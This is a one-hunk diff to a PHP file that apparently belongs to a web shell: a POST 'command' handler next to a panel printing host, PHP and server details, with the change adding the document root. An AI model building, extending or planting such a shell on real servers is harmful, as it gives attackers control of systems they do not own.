@@ -287,6 +287,7 @@ if(isset($_POST["command"])){
             echo "Host Info: ".php_uname()."<br>"; 
             echo "PHP: ". phpversion()."<br>";
             echo "HTTP: ".$_SERVER['SERVER_SOFTWARE']."<br>";
+            echo "Root: ".$_SERVER['DOCUMENT_ROOT'];
             ?>
         </p>
 
